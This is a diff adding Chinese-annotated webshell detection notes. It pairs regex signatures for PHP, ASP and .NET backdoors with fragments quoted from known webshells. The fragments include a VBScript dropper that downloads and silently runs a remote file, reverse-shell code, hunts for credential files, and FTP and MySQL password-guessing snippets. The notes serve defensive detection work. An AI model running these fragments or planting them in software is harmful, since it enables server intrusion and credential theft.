@@ -1,0 +1,777 @@
+
+
+
+#正则匹配规则
+
+1. \bSystem\.IO\.StreamWriter\b|\bRequest.Files\[0\]\.SaveAs
+
+1. clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8|clsid:13709620-C279-11CE-A49E-444553540000|clsid:0D43FE01-F093-11CF-8940-00A0C9054228|clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B
+
+1. \bassert\s*\(+\s*
+
+    判断一个表达式是否成立, 返回true or false, 若为false则给出Warning提醒
+    
+1. \bVBScript\.Encode\b|\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript)\.encode\b
+
+    下面这个是vb脚本
+
+1. \beval\s*\(+\s*\$_|\beval_r\s*\(+\s*\$_|\beval\s*\(\s*@?base64_decode\s*\(|\beval\s*\(\s*@?gzuncompress\s*\(\s*@?base64_decode\(|\beval\s*\(\s*@?gzinflate\s*\(\s*@?base64_decode\(|\s*'\s*:\s*eval|'?e'?\.?'?v'?\.?'?a'?\.?'?l'
+
+    - eval(
+    - eval_r(                                   //! 计算某个字符串, 并执行其中的JavaScript代码
+    - eval(@base64_decode(
+    - eval(@gzuncompress(@base64_decode(        //! uncompress a compressed string
+    - eval(@gzinflate(base64_decode(            //! inflate a deflated string
+    - ':eval
+    - 'e'v'a'l
+
+1. \beval\s*\(+\s*request|\beval_r\s*\(+\s*request
+
+    - `eval (request`
+    - `eval_r( request`
+
+1. \beval\s+request|\beval_r\s+request
+
+    - eval request                              //! ASP eval request("pass")
+    - eval_r request                            //! ASP.NET eval(Request
+
+1. \s{0,10}=\s{0,10}[{@]{0,2}(\$_(GET|POST|REQUEST)|file_get_contents|str_replace|["\']a["\']\.["\']s["\']\.|["\']e["\']\.["\']v["\']\.|["\']ass["\']\.).{0,10}
+
+    - `          =          {$_GET`             //! 
+    - `          =          @{$_POST`           //!
+    - ` = file_get_contents`                    //! PHP 把整个文件读入一个字符串中
+    - ` =@str_replace`                          //! 以其他支付替换字符串中的一些字符
+    - ` =   {"a".'s'.`
+    - ` =   {"e".'v'.`
+    - `=    @'ass'.))))))))ff`
+    - `$_GET["hello"]   (  @$_POST['world'])`
+    - `$_hello($WORD)`
+    - `={$_GET`
+    - `={"a"."s".`
+    - `={"ass".`
+
+1. \s{0,10}=\s{0,10}([{@]{0,2}\\\\{0,1}\$_(GET|POST|REQUEST)|file_get_contents|["\']a["\']\.["\']s["\']\.|["\']e["\']\.["\']v["\']\.|["\']ass["\']\.).{0,20}
+
+    - ` = @{\\$_REQUEST`
+    - `=file_get_contents().hello`
+    - `'a'.'s'.`
+    - `'e'.'v'.`
+    - `'ass'.`
+
+1. \s{0,10}=\s{0,10}([{@]{0,2}\$_(GET|POST|REQUEST)|[\'"]{0,1}php://input[\'"]{0,1}|file_get_contents).{0,20}
+
+    - ` = @$_GET`
+    - `='php://input'`
+    - `=file_get_contents`
+    - `   =  {@$_REQUEST1231asdf1r12`
+    - ` ='php://input'89uj9128e7`               //! php://input是一个可以访问请求的原始数据的只读流, 可以读取http entity body中指定长度的值
+    - `file_get_contents`
+
+1. \$_(GET|POST|REQUEST)\[.{0,15}\]\s{0,10}\(\s{0,10}\$_(GET|POST|REQUEST).{0,15}
+
+    - `$_POST[adfasdvwe] (  $_REQUEST1253d1234`
+
+1. (include|require)(_once){0,1}(\s{0,5}|\s{0,5}\(\s{0,5})[\'"]{0,1}(\$(_(GET|POST|REQUEST|SERVER)(\[[\'"]{0,1})\w{0,8}([\'"]{0,1}\])|[\w]{1,15}))[\'"]{0,1}
+1. (include|require)(_once){0,1}(\s{0,5}|\s{0,5}\(\s{0,5})[\'"]{0,1}(\$(_(GET|POST|REQUEST|SERVER)(\[[\'"]{0,1})\w{0,8}([\'"]{0,1}\])))[\'"]{0,1}  -- actived 
+
+    - `include_once('$_GET['hello']'`
+    - `require_once$hello'`
+    - `include_once('$hello'`                   //! include()与require()除了怎样处理失败之外各方面都完全一样
+    - `require('$_REQUEST['eight']`             //! require()语句包括并运行指定文件。 
+
+1. [\'"](include|require)(_once){0,1}\s{0,5}\(\s{0,5}["\']([\.\w\,/\\\+-_]{1,60})["\']\s*\){0,1}
+
+    - `'require('1+request')`
+    - `'include_once('he,/\-')`
+
+1. (eval|assert)[\s|\n]{0,30}\([\s|\n]{0,30}(\\\\{0,1}\$((_(GET|POST|REQUEST|SESSION|SERVER)(\[[\'"]{0,1})[\w\(\)]{0,15}([\'"]{0,1}\]))|\w{1,10}))\s{0,5}\)
+
+    - `eval(\\$_GET['h()e()'])`
+    - `eval  ( \$_SERVER['a()b()'])`
+    - `assert (\$hello)`
+    - `eval|(|\\$_GET['hello()'])`
+    - `assert(\$hello)`
+
+1. (eval|assert)\s*\(\s*([\\]{0,2}\$((_(GET|POST|REQUEST|SESSION|SERVER)(\[[\'"]{0,1})[\$\w\(\)]{0,15}([\'"]{0,1}\]))))\s{0,5}\)  -- actived
+
+    - `eval(\$_GET['hello()'])`
+    - `eval(\\$_GET[hello()])`
+
+1. (eval|assert)\(.*\$_(GET|POST|REQUEST|SESSION|SERVER)\[
+
+    - `eval($_GET[`
+
+1. preg_replace[\s\n]{0,10}\([\s\n]{0,10}((["\'].{0,15}[/@\'][is]{0,2}e[is]{0,2}["\'])|\$[a-zA-Z_][\w"\'\[\]]{0,15})\s{0,5},\s{0,5}.{0,40}(\$_(GET|POST|REQUEST|SESSION|SERVER)|str_rot13|urldecode).{0,30}  -- actived
+
+    - `preg_replace("/test/e",$_GET["h"],"jutst test");`                            //! preg_replace执行一个正则表达式的搜索和替换, 当/e修饰符被使用时, replacement(第二个参数)将被当作php代码执行, 并且使用代码返回的结果作为replacement
+    - `preg_replace($abce[], str_rot13`         //! str_rot13对字符串进行进行str_rot13编码, 编码解码都是这个函数(13*2=26)
+    - `preg_replace($abce[], urldecode`
+    - `preg_replace('hello/eis', $_SERVER`
+    - `preg_replace($hello[], $_str_rot13`
+
+1. preg_replace[\s\n]{0,10}\([\s\n]{0,10}((["\'].{0,15}[/@\'~][is]{0,2}e[is]{0,2}["\']))\s{0,5},\s*\$_(GET|POST|REQUEST|SESSION|SERVER)(\[[\'"]{0,1})[\$\w\(\)]{0,15}([\'"]{0,1}\])
+
+    - `preg_replace('hello/ise',$_GET['world()']`
+    - `preg_replace('hello/esi',$_SESSION['world()']`
+
+1. (\$(_(GET|POST|REQUEST|SESSION|SERVER)(\[[\'"]{0,1})\w{1,12}([\'"]{0,1}\])|\w{1,10}))[\s\n]{0,20}\([\s\n]{0,20}(@{0,1}\$(_(GET|POST|REQUEST|SESSION|SERVER)(\[[\'"]{0,1})\w{1,12}([\'"]{0,1}\])|\w{1,10}))[\s\n]{0,5}\)
+
+    - `$_GET["hello"](@$_POST["world"])`
+    - `$hello($world)`
+
+1. (\$(_(GET|POST|REQUEST|SESSION|SERVER)(\[[\'"]{0,1})\w*([\'"]{0,1}\])))\(  -- actived
+
+    - `$_GET['hello'](`
+
+1. (eval|assert)[\s|\n]{0,30}\(.*(gzuncompress|gzinflate){0,1}\([\s|\n]{0,30}base64_decode  -- actived
+
+    - `eval(gzuncompress(base64_decode`
+    - `assert(gzinflate(base64_decode`
+    - `eval(gzuncompress(|base64_decode`
+    - `assert(gzinflate(base64_decode`
+
+1. call_user_func[\s\n]{0,25}\(.{0,25}\$_(GET|POST|REQUEST).{0,15}  -- actived
+
+    - `call_user_func(hellohellohello$_REQUEST` //! 把第一个参数作为回调函数调用
+
+1. array_map[\s\n]{0,20}\(.{1,5}(eval|assert|ass\\x65rt).{1,20}\$_(GET|POST|REQUEST).{0,15}  -- actived
+
+    - `array_map(helloeval$_POST`               //! array_map将函数作用到数组中的每一个值上, 并返回用户自定义函数作用后的带有新值的数组。
+    - `array_map(worldass\x65rt$_REQUEST`       //! \x65就是字符e, 但是不了解如何转义成字符串
+
+1. \$_(GET|POST|REQUEST)\[.{0,15}\]\s{0,10}\(\s{0,10}\$_(GET|POST|REQUEST).{0,15}
+
+    - `$_POST[hello]($_REQUEST`
+1. \bproc_open\b
+
+    - `proc_open`                               //! [[执行一个命令，并且打开用来输入/输出的文件指针。]]
+1. \bpassthru\s*\(
+
+    - `passthru`                                //! PHP passthru执行外部程序并不加处理输出资料
+
+1. shell_exec
+
+    - `shell_exec`                              //! 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
+
+1. \b(passthru|shell_exec|exec|system|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)\s*\(
+
+    - `exec(`                                   //! 执行一个外部程序
+    - `system(`                                 //! 执行外部程序，并且显示输出
+    - `popen(`                                  //! 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。
+    - `curl_exec(`                              //! 执行给定的cURL会话。cURL是一个利用URL语法在命令行下工作的文件传输工具
+    - `curl_multi_exec(`
+    - `parse_ini_file(`                         //! 解析一个配置文件，并以数组的形式返回其中的设置
+    - `show_source(`                            //! 语法高亮一个文件, 是highlight_file的别名, 当使用该函数时, 整个文件都将被显示, 包括密码和其他敏感信息
+
+1. =\s*(\'|")(assert|eval|preg_replace|base64_decode|passthru|shell_exec|exec|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source|substr)(\'|")
+1. =\s*(\'|")?(assert|system|eval|preg_replace|base64_decode|passthru|shell_exec|exec|system|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)(\'|")?
+
+    - `='assert'`
+    - `='curl_multi_exec'`
+
+1. \bSystem\.Net\.Sockets\b|\bnew\s+Socket\b|\bSystem\.Diagnostics\b|\bSystem\.ServiceProcess\b
+
+    - `System.Net.Sockets`                      //! Socket 类为网络通信而提供了丰富的方法和属性。Socket 类允许你使用 ProtocolType 枚举中被列出的任何通信协议来完成同步数据传送和异步数据传送。
+    - `new Socket`
+    - `System.Diagnostics`                      //! 该命名空间提供了一些与系统进程、事件日志、和性能计数器进行交互的类库, 提供对本地和远程进程的访问权限并使你能够启动和停止本地系统进程。
+    - `System.ServiceProcess`                   //! 提供用于实现、安装和控制 Windows 服务应用程序的类
+
+1. \bServer.CreateObject\s*\(\s*""ScriptControl""\s*\)
+
+    - `Server.CreateObject(""ScriptControl"")`  //! CreateObject 方法创建服务器组件的实例, ScriptControl使用户可以创建运行任何scripting引擎
+
+1. \bexecute\s+request|\bserver.execute\s+request|\bExecute\s+Session|\bExecuteGlobal\s+request
+
+    - `execute request`
+    - `server.execute request`
+    - `Execute Session`                         //! 执行一个或多个语句　忽略语句的返回值 
+    - `ExecuteGlobal request`                   //! 执行一个功多个在脚本全局名字空间中指定的语句
+
+1. \bSystem.Reflection.Assembly.Load|\.ExecuteStatement\s*\(|\bSystem\.Reflection\.Assembly\.Load\(Request\.BinaryRead\b|\bRuntime\.getRuntime\(\)\.exec\b
+
+    - `System.Reflection.Assembly.Load`          //! 在给定程序集信息，加载程序集
+    - `.ExecuteStatement(`
+    - `System.Reflection.Assembly.Load(Request.BinaryRead`
+    - `Runtime.getRuntime().exec`               //! 在程序中调用另一个现成的可执行程序或系统命令
+
+1. \.CreateTextFile\s*\(|\.OpenTextFile\s*\(|\.SaveToFile\s+|\bcopy\s*\(\s*\$_FILES
+
+    - `.CreateTextFile(`
+    - `.OpenTextFile(`
+    - `.SaveToFile`
+    - `copy($_FILES`                            //! 将文件从 source 拷贝到 dest
+
+1. \bSystem\.DirectoryServices\b
+
+    - `System.DirectoryService`                 //! 使用 Active Directory 服务接口 (ADSI) 技术, 作为使用各种网络提供程序的灵活的工具
+
+1. \bxp_cmdshell\b
+
+    - `bxp_cmdshell`                            //!  xp_cmdshell 扩展存储过程将命令字符串作为操作系统命令 shell 执行，并以文本行的形式返回所有输出
+
+1. \bwscript\.shell\b|\bShell\.Application\b
+
+    - `wscript.shell`                           //! WScript.Shell是WshShell对象的ProgID，创建WshShell对象可以运行程序、操作注册表、创建快捷方式、访问系统文件夹、管理环境变量
+    - `Shell.Application`                       //! 表示shell中的对象, 被提供于控制外壳和执行外壳内的命令
+
+1. `\$_Request\[.*`|`\$_GET\[.*`|`\$_POST\[.*`
+
+    - ``$_Request[``
+    - ``$_GET[``
+    - ``$_POST[``
+
+1. \'ev'\.\'a\'\.\'l\'|\'ev\'\.\'a\'\.\'l\'|\'ev\'\.\'al\'|\'eva\'\.\'l\'|\'e\'\.\'va\'\.\'l\'|\'e\'\.\'val\'  -- actived
+
+    - `'ev'.'a'.'l'`
+    - `'ev'.'al'`
+    - `'eva'.'l'`
+    - `'e'.'va'.'l'`
+    - `'e'.'val'`
+
+1. phpinfo
+
+    - `phpinfo`
+
+1. 木马|提权|旁注|WebAdmin2Y|chopper|webshell|/etc/passwd|/etc/shadow|caidao|backdoor|rootkit|\.htpasswd|php\s*(web)?shell|Georg\s*says|www\.4ngel\.net|back_connect_c|angel_bc|\$_SESSION\[\"writebuf\"\]
+
+    - `WebAdmin2Y`                              //! WebAdmin.2Y后门软件中使用的dll组件名
+    - `.htpasswd`                               //! 建立和更新用于基本认证的存储用户名/密码的文本文件。如果htpasswd不能读写此文件，它返回一个出错代码，而不做任何修改。
+    - `phpwebshell`
+    - `Georgsays`
+    - `www.4ngel.net`
+    - `back_connect_c`
+    - `angel_bc`
+    - `$_SESSION["writebuf"]`
+
+1. (preg_replace.*\/e|`.*?\$.*?`|\bcreate_function\b|\bpassthru\b|\bshell_exec\b|\bexec\b|\bbase64_decode\b|\bedoced_46esab\b|\beval\b|\bsystem\b|\bproc_open\b|\bpopen\b|\bcurl_exec\b|\bcurl_multi_exec\b|\bparse_ini_file\b|\bshow_source\b)
+
+****
+
+
+
+#1400 GO GO GO
+* 语义匹配目标
+2. 次关键语义匹配目标
+3. 次次关键语义匹配目标
+1. 语义匹配语句
+2. 次关键语义匹配语句
+- 粗暴特征语句
+
+
+##138shell
+
+###A
+
+* passthru(getenv("HTTP_ACCEPT_LANGUAGE"))
+
+* Set entrika = CreateObject("Scripting.FileSystemObject")
+* Set entrika = entrika.CreateTextFile("c:\net.vbs", True)
+* entrika.write "Set xml = CreateObject(""Microsoft.XMLHTTP"")" & vbcrlf
+* entrika.write "xml.Open ""GET"",""http://www35.websamba.com/cybervurgun/file.zip"",False" & vbcrlf
+* "Set WshShell = CreateObject(""WScript.Shell"")" & vbcrlf
+* entrika.write "WshShell.Run ""c:\downloaded.zip"", 0, false" & vbcrlf
+* WshShell.Run "c:\net.vbs", 0, false
+
+* function_exists(passthru)
+* function_exists(exec)
+* function_exists(system)
+* function_exists(shell_exec)
+* file('/etc/passwd/')
+* strtolower($cmd) == "etcpasswdfile"
+* system("/bin/sh")
+
+2. if ( function_exists('ini_get') ) {       //! lower
+2. @chmod("$deldir/$file",0777);             //! lower
+2. print "<b>".get_current_user()."~# </b>". htmlspecialchars($cmd)."<br>";            //!
+3. if( ini_get('safe_mode') ){
+2. if( ini_get('open_basedir') ){
+2. if (ini_get('register_globals') != '1') {
+2. $onoff = get_cfg_var('register_globals');
+3. get_cfg_var
+4. exec('pwd')                              //! lower+2
+2. fileoperms
+2. phpinfo
+3. elseif((ereg("changeworkdir (.*)",$cmd,$file)) || (ereg("cd (.*)",$cmd,$file)))
+3. popen
+
+
+****
+
+1. passthru\(
+
+    - <?php passthru(getenv("HTTP_ACCEPT_LANGUAGE")); echo '<br> by q1w2e3r4'; ?>
+
+1. \bCreateObject\("WScript\.Shell"\)
+2. \bCreateObject\("Scripting.FileSystemObject"\)
+
+    - Set WshShell = CreateObject("WScript.Shell")
+
+2. CreateObject\("Scripting.FileSystemObject"\)
+1. CreateTextFile\(
+1. \.write\s*"\s*xml\.Open\s*"\s*"GET"\s*"\w*"
+1. CreateObject\(""?WScript.Shell""?\)"?
+1. CreateObject\(""?Microsoft.XMLHTTP""?\)"?
+1. \.Run%s*""?%w*""?%s*,%s*0,%sfalse
+
+
+2. print "<b>".get_current_user()."~# </b>". htmlspecialchars($cmd)."<br>";            //!
+2. socket(TO_SERVER, PF_INET, SOCK_STREAM, getprotobyname('tcp'));         //!
+3. elseif((ereg("changeworkdir (.*)",$cmd,$file)) || (ereg("cd (.*)",$cmd,$file)))
+3. connect(TO_SERVER, $paddr) or die "$port:$internet_addr:$!\n";
+3. is_writable(
+3. fsockopen(
+
+****
+
+- "c:\net.vbs"
+- "WScript.Shell"
+- "C:\downloaded.zip"
+
+- shellhelp
+- Ajax/PHP Command Shell
+- Ironfist
+- $_GET['runcmd']
+- runcommand('canirun', 'GET')
+- runcommand('showinfo', 'GET')
+- runcommand('etcpasswdfile', 'GET')
+- runcommand('netstat -an | grep -i listen', 'GET')
+- runcommand('ps -aux', 'GET')
+- runcommand('shellhelp', 'GET')
+- canirun           //! TODO 
+
+- $_POST['p4ssw0rD']
+- $sd98 = "john.barker446@gmail.com";
+- by Grinay
+- Antichat Shell
+- COPYRIGHT BY ANTICHAT.RU
+
+- "Asmodeus Perl Remote Shell
+
+- Ayyildiz Tim  | AYT | Shell v 2.1 Biz B&uuml;y&uuml;k T&uuml;rk Milletinin Hizmetindeyiz...
+- PHPSHELL_VERSION
+- Bulundugunuz Dizin
+- Powered  byThehacker.
+
+- <title>azrail 1.0 by C-W-M</title>
+- <center><font size='+2' color='#FFFFFF'>C-W-M</font><font size='+2' color='#FF0000'>HACKER</font><br>
+- Root Klasör               //! root folder
+- Root Klasörüne Git        //! Go to the root folder
+
+
+###B
+
+4. fsockopen(
+4. pfsockopen(
+4. stream_socket_client(
+4. socket_create(
+4. socket_connect(
+4. socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp'))
+4. connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0])))
+
+* eval($code);        //!
+2. echo "{${passthru($cmd)}}<br>";         //!
+* execl("/bin/sh","sh","-i",(char*)0)
+2. dup2(insock, 0)
+2. dup2(insock, 1)
+2. dup2(insock, 2)
+5. recv(\w*,\s&\w, \w*\)
+5. size=recv(insock,&buf,BUFSIZ,0);
+5. send(insock,"pass?",6,0);
+
+****
+
+- backdoor1.php
+- Backdoor php v0.1
+- Coded By Charlichaplin
+- charlichaplin@gmail.com
+- Join me: irc.fr.worldnet.net #s-c
+- Greetz: My dog :)
+
+- backdoorfr.php
+- backdoor(
+- Coded By Charlichaplin
+- Backdoor PHP codée par rAidEn & LFL
+
+- Blind Shell.cpp
+
+****
+
+###C
+
+2. file_get_contents("/usr/local/apache/conf/httpd.conf")
+2. file_get_contents("/etc/httpd.conf")
+4. file_get_conntents(
+5. mysql_get_server_info(
+5. ini_get("open_basedir")
+5. ini_get('disable_functions')
+5. ini_get("safe_mode_exec_dir")
+3. [.@]phpversion(
+3. php_uname(
+3. fileperms(
+3. commands.getstatus(
+2. posix_getpwuid(
+3. posix_getgrgid(
+* fopen("/etc/passwd", "r");
+6. filemtime(
+6. fileowner(
+6. filegroup(
+3. posix_kill(
+4. @ignore_user_abort(true);
+4. getenv
+* shell_exec($cmd)
+* exec($cmd, $result)
+* system($cmd)
+* passthru($cmd)
+* @chmod("$deldir/$file",0777);
+* os.system(
+* os.popen(
+* commands.getstatusoutput(
+* commands.getoutput(
+* Popen                         python
+
+6. ftp_connect(
+6. ftp_login(
+
+5. file_exists(
+9. fopen(
+9. fread(
+9. fwrite(
+9. fclose(
+9. fget(
+9. fpassthru
+9. move_uploaded_file
+9. is_wirtable(
+9. is_readable(
+9. is_dir
+9. $_POST['file']
+
+9. mysql_fetch_array
+9. mysql_query
+9. mysql_fetch_assoc
+9. mysql_list_dbs
+9. mysql_list_tables
+
+9. pg_connect(
+9. mssql_connect(
+9. mysql_connect(
+9. ocilogon(
+9. oci_connect(
+
+9. imap_open(
+9. imap_body(
+9. imap_close(
+9. curl_ini(
+9. curl_exec(
+
+1. Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
+2. Server.CreateObject("WSCRIPT.SHELL")
+4. Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+4. open(STDIN,          //! perl
+4. open(STDOUT,          //! perl
+4. open(STDERR,          //! perl
+
+* system("unset HISTFILE; unset SAVEHIST ; uname -a;
+2. system("id;echo;")
+3. system("pwd;");
+3. $path= exec(\"pwd\")
+5. getcwd(
+5. <?php echo $SERVER_NAME; ?>              //? php 不确定
+5. $GATEWAY_INTERGACE
+5. $SERVER_PROTOCOL
+5. $SERVER_ADMIN
+5. $SERVER_PORT
+5. <?php echo $SERVER_ADDR; ?>
+2. system('tasklist')
+
+5. base_decode(
+* <%@ LANGUAGE = VBScript.Encode %>
+
+
+****
+
+- c99{1}.php
+- http://ccteam.ru/
+- http://rootshell-team.info
+- Captain Crunch Security Team
+- http://rootshell-security.net
+- c99shvars
+4. c99sh_getupdate(
+4. c99sh_updatefurl
+5. c99_sess_put
+5. c99fsearch
+- You can crack winnt passwords.
+- and lcp.crack+
+
+- c99.php
+- c99shell.php
+- c99sh_bindport
+- Admin@SpyGrup.Org
+- YaduriS@SpyCrup.Org
+- SpyGrup.Org
+- c99sh_surl
+- Kruis & YaduriS
+- c99_buff_prepare
+- c99ftpbrutecheck
+
+- c100 Shell
+- Shadow & Preddy
+- www.Locus7s.com
+
+- Casus15.php
+- casus15.php
+- CasuS 1.5 by MafiABoY
+- MafiABoY
+- <center><font size='+2' color='#FFFFFF'>A TURKISH </font><font size='+2' color='#FF0000'>HACKER</font><br>
+
+- cgi-shell.py
+- Michael Foord
+- michael AT foord DOT me DOT uk
+- michael@foord.me.uk
+- Maintained at www.voidspace.org.uk/atlantibots/pythonutils.html
+
+- CMD.asp
+- maceo @ dogmile.com
+
+- CmdAsp.asp
+
+- WwW.CoM Security Hackers
+- MasterKid, AleXutz, FatMan & MiKuTuL
+- muzicteam2006@yahoo.com
+- ConnectBack Backdoor Shell
+- WwW.CoM Hackers SABOTAGE
+
+- CrystalShell
+- Super-Crystal and Mohajer22
+- Arab Security Center Team
+- mail : sup3r-hackers@hotmail.Com
+- october73 shell & CrystalShell < coding by super crystal
+
+- ctt_sh.php
+- myshellexec
+
+- cybershell
+- Cyber Shell
+- pixcher@mail.ru
+
+****
+
+###D
+
+* base64_decode($images[
+4. readfile(            //! PHP 输出一个文件
+4. @file_exists("/usr/X11R6/bin/xterm")
+4. @file_exists("/usr/bin/lynx"
+5. @file_exists("/usr/bin/gcc"
+5. @file_exists("/usr/bin/cc")
+3. @file_exists("/usr/bin/nc")
+3. @file_exists("/usr/bin/wget")
+3. posix_getgid(
+3. posix_getegid(
+3. posix_getuid(
+3. posix_geteuid(
+3. posix_getppid(
+3. posix_getpgid(
+3. posix_getpid(
+3. posix_getsid(
+* proc_open(
+* escapeshellarg(
+9. mail(
+
+****
+
+- dC3 Security Crew Shell PRiV.php
+- dC3 Security Crew
+- Bl0od3r
+- http://dc3.dl.am/
+
+- Dive Shell
+- Emperor Hacking Team
+- iM4n - FarHad - imm02tal - R$P
+- revengans@gmail.com
+- DxShell
+- by î_Î Tync
+- http://hellknights.void.ru/
+- ICQ#244648
+3. File CHMOD
+3. Expl0its
+2. XSS Server
+2. 'show opened ports'=>'netstat -an | grep -i listen',
+2. 'find config* files'=>'find / -type f -name "config*"',
+2. 'find all *.php files with word "password"'=>'find / -name *.php | xargs grep -li password',
+2. 'find all writable directories and files'=>'find / -perm -2 -ls',
+2. 'list file attribs on a second extended FS'=>'lsattr -va',
+2. 'View syslog.conf'=>'cat /etc/syslog.conf',
+2. 'View Message of the day'=>'cat /etc/motd',
+2. 'View hosts'=>'cat /etc/hosts',
+2. 'List processes'=>'ps auxw',
+2. 'List user processes'=>'ps ux',
+2. 'Locate httpd.conf'=>'locate httpd.conf',
+2. 'Interfaces'=>'ifconfig',
+2. 'CPU'=>'/proc/cpuinfo',
+2. 'RAM'=>'free -m',
+2. 'HDD'=>'df -h',
+2. 'OS Ver'=>'sysctl -a | grep version',
+2. 'Kernel ver' =>'cat /proc/version',
+- john.barker446@gmail.com
+- http://hellknights.void.ru/
+
+****
+
+###E
+
+9. cstrMSSQL
+9. cstrJET
+9. cstrACCESS
+9. cstrORACLE
+9. cstrMYSQL
+9. cstrDSN
+9. .CreateObject("CDONTS.NewMail")
+9. Set lobjFSO = Server.CreateObject("Scripting.FileSystemObject")
+9. .GetFolder(
+9. .GetFile(
+9. OpenTextFile(
+9. FileExists(
+9. CreateTextFile(
+9. CraeteFolder(
+9. Set lobjStream = Server.CreateObject("ADODB.Stream")
+9. SaveToFile(
+9. Write
+4. .MapPath(        //! ASP 指定的路径影射到服务器上相应的物理路径上
+4. .GetAbsolutePathName(
+
+****
+
+- forever5pi@yahoo.com
+- http://vnhacker.org
+- forever5pi
+
+****
+
+###F
+
+* _POST['cmd']
+
+****
+
+- FaTaLSheLL
+- StarHack.oRg
+- fuckhacker
+
+****
+
+###G
+
+5. function_exists('curl_version')
+5. function_exists("mysql_connect')
+3. $r=mysql_query("SHOW CREATE TABLE `".$tab."`", $connect);
+3. $r=mysql_query("SELECT * FROM `".$tab."`", $connect);
+* ftp_login($conn_id, $v, $v)      //! 账号密码一致
+* (ftp_login($conn_id, $v, "")){      //! 无密码?
+* $conn_id=mysql_connect($host,$v,$v);
+* $conn_id=mysql_connect($host,$v,"");
+* if (ftp_login($conn_id, $v, strrev($v))){
+* $conn_id=mysql_connect($host,$v,strrev($v));
+* 
+* 
+2. 
+
+****
+
+- GFS Web-Shell
+- gfs_sh.php
+- _POST['b_safe_fuck']
+
+****
+
+###H
+
+* exec("whoami");
+3. posix_uname(
+
+****
+
+- h4ntu shell
+- powered by tsoi
+
+****
+
+###I
+
+[文件头与文件格式不符](http://wenku.baidu.com/link?url=XCg3sH4gHxnW4uY5WI0y2LgpndustUHgxlTIJ097UpGt9_bDEwV2miLWb_sf3YmXWEgCp9af2lDBQq3x3ZvY59qWSTKfrcI5FLhMLwCS8rC&qq-pf-to=pcqq.discussion)
+
+Show open ports (nst) netstat -an | grep LISTEN | grep tcp
+last root (nst) last root
+last (all users) (nst) last all
+Find all config.php in / (nst) find / -type f -name config.php
+Find all config.php in . (nst) find . -type f -name config.php
+Find all admin.php in / (nst) find / -type f -name admin.php
+Find all admin.php in . (nst) find . -type f -name admin.php
+Find all config.inc.php in / (nst) find / -type f -name config.inc.php
+Find all config.inc.php in . (nst) find . -type f -name config.inc.php
+Find all config.inc in / (nst) find / -type f -name config.inc
+Find all config.inc in . (nst) find . -type f -name config.inc
+Find all config.dat in / (nst) find / -type f -name config.dat
+Find all config.dat in . (nst) find . -type f -name config.dat
+Find all config* in / (nst) find / -type f -name config*
+Find all config* in . (nst) find . -type f -name config*
+Find all pass* in / (nst) find / -type f -name pass*
+Find all pass* in . (nst) find . -type f -name pass*
+Find all .bash_history in / (nst) find / -type f -name .bash_history
+Find all .bash_history in . (nst) find . -type f -name .bash_history
+Find all .htpasswd  in / (nst) find / -type f -name .htpasswd
+Find all .htpasswd  in . (nst) find . -type f -name .htpasswd
+Find all writable dirs/files in / (nst) find / -perm -2 -ls
+Find all writable dirs/files in . (nst) find . -perm -2 -ls
+Find all suid files in / (nst) find / -type f -perm -04000 -ls
+Find all suid files in . (nst) find . -type f -perm -04000 -ls
+Find all sgid files in / (nst) find / -type f -perm -02000 -ls
+Find all sgid files in . (nst) find . -type f -perm -02000 -ls
+Find all .fetchmailrc files in / (nst) find / -type f -name .fetchmailrc
+Find all .fetchmailrc files in . (nst) find . -type f -name .fetchmailrc
+OS Version? (nst) sysctl -a | grep version
+Kernel version? (nst) cat /proc/version
+cat syslog.conf (nst) cat /etc/syslog.conf
+Cat - Message of the day (nst) cat /etc/motd
+Cat hosts (nst) cat /etc/hosts
+Distrib name (nst) cat /etc/issue.net
+Distrib name (2) (nst) cat /etc/*-realise
+Display all process - wide output (nst) ps auxw
+Display all your process (nst) ps ux
+Interfaces (nst) ifconfig
+CPU? (nst) cat /proc/cpuinfo
+RAM (nst) free -m
+HDD space (nst) df -h
+List of Attributes (nst) lsattr -a
+Mount options (nst) cat /etc/fstab
+Is cURL installed? (nst) which curl
+Is wGET installed? (nst) which wget
+Is lynx installed? (nst) which lynx
+Is links installed? (nst) which links
+Is fetch installed? (nst) which fetch
+Is GET installed? (nst) which GET
+Is perl installed? (nst) which perl
+Where is apache (nst) whereis apache
+Where is perl (nst) whereis perl
+locate proftpd.conf (nst) locate proftpd.conf
+locate httpd.conf (nst) locate httpd.conf
+locate my.conf (nst) locate my.conf
+locate psybnc.conf (nst) locate psybnc.conf
+
+$fast_commands_win = "
+OS Version (nst) ver
+Tasklist  (nst) tasklist
+Attributes in . (nst) attrib
+Show open ports (nst) netstat -an
+
+
+****
+
+
+
+
+
+
+
+
+
+
